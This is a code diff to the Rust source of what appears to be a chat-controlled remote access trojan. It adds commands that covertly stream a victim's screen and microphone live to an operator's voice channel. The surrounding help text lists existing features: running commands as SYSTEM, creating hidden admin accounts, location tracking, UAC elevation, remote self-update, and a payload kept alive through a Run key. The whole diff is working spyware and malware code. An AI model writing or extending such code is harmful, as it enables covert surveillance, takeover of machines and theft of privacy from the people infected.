@@ -58,6 +58,9 @@ const HELP: &str = "\
 !location                  precise location (Windows Location API)
 !systask <cmd>             run a command as SYSTEM, return output (admin)
 !newuser <name> <pass>     create a local admin account (admin)
+!screenshare               join voice + share the screen live
+!voice                     join voice + stream the microphone live
+!vc stop                   stop a live voice stream
 !lock                      lock workstation
 !update                    pull newest build from #update and restart
 !uninstall                 remove payload + launcher + Run key, then stop
@@ -614,6 +617,60 @@ pub async fn dispatch(
                 let (n, p) = (name.to_string(), pass.to_string());
                 let r = tokio::task::spawn_blocking(move || host::new_user(&n, &p)).await?;
                 st.send_code(console, &r).await?;
+            }
+        }
+        "screenshare" | "share" => {
+            st.send(console, "joining voice + sharing screen ...").await?;
+            let st2 = st.clone();
+            let cfg2 = cfg.clone();
+            let ws2 = ws.clone();
+            tokio::spawn(async move {
+                match crate::voice::screenshare(&st2, &cfg2, &ws2).await {
+                    Ok(ch) => {
+                        let _ = st2
+                            .send(
+                                &ws2.channels.console,
+                                &format!("screenshare live — join the voice channel ({ch}) to watch"),
+                            )
+                            .await;
+                    }
+                    Err(e) => {
+                        let _ = st2
+                            .send(&ws2.channels.console, &format!("screenshare failed: {e:#}"))
+                            .await;
+                    }
+                }
+            });
+        }
+        "voice" | "micstream" => {
+            st.send(console, "joining voice + streaming mic ...").await?;
+            let st2 = st.clone();
+            let cfg2 = cfg.clone();
+            let ws2 = ws.clone();
+            tokio::spawn(async move {
+                match crate::voice::voice_mic(&st2, &cfg2, &ws2).await {
+                    Ok(ch) => {
+                        let _ = st2
+                            .send(
+                                &ws2.channels.console,
+                                &format!("mic live — join the voice channel ({ch}) to listen"),
+                            )
+                            .await;
+                    }
+                    Err(e) => {
+                        let _ = st2
+                            .send(&ws2.channels.console, &format!("voice failed: {e:#}"))
+                            .await;
+                    }
+                }
+            });
+        }
+        "vc" => {
+            if arg.trim().eq_ignore_ascii_case("stop") {
+                crate::voice::STOP.store(true, std::sync::atomic::Ordering::SeqCst);
+                st.send(console, "stopping voice stream").await?;
+            } else {
+                st.send(console, "usage: !vc stop").await?;
             }
         }
         "uac" | "elevate" => {
